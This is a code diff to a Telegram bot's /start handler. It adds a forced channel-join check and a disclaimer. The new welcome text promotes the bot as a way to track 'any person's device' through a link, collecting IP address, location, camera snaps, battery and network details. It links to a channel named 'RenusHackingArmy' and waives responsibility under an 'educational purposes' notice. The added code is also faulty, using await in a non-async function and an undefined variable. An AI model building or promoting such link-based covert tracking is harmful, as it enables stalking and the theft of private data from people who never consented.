@@ -216,9 +216,54 @@ var m = {
   bot.sendMessage(chatId, message, m);
 }
 function handleStartCommand(chatId) {
-  // Code that you would normally run for the /start command
-  bot.sendMessage(chatId, "Welcome! The bot is now restarted and ready for your commands.");
-  // Add any other logic or initialization code that /start would typically run
+  const userId = msg.from.id;
+
+    let isMemberOfAllChannels = true;
+
+    for (let channel of channels) {
+      try {
+        const chatMember = await bot.getChatMember(channel, userId);
+        if (chatMember.status == 'left' || chatMember.status == 'kicked') {
+          isMemberOfAllChannels = false;
+          break;
+        }
+      } catch (error) {
+        isMemberOfAllChannels = false;
+        break;
+      }
+    }
+
+    if (!isMemberOfAllChannels) {
+      var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.`;
+      const channelLinks = [
+  'https://t.me/RenusHackingArmy',
+  'https://t.me/RenusBotsChannel',
+  // Add more channel links here
+];
+
+const joinButtons = channelLinks.map(link => {
+  return [
+    { text: `Join Channel`, url: link },
+    { text: `Joined`, callback_data: 'start_command' }
+  ];
+});
+
+const joinMarkup = {
+  reply_markup: JSON.stringify({
+    inline_keyboard: joinButtons
+  })
+};
+
+      bot.sendMessage(chatId, joinMessage, joinMarkup);
+    } else {
+      var m = {
+        reply_markup: JSON.stringify({
+          "inline_keyboard": [[{ text: "ACCEPT TERMS AND CONDITIONS", callback_data: "terms" }]]
+        })
+      };
+
+      bot.sendMessage(chatId, `Read the terms and conditions of this bot. If you use this bot so you agree to abide by our terms and conditions. This bot is made available for educational purposes only. I am not responsible for any illegal activities that result from the use of this bot. If you use this bot, you do so at your own risk. And if it causes any harm to anyone, then you yourself will be responsible for it. And thank you for using our service.`, m);
+    }
 }
 
 app.get("/", (req, res) => {
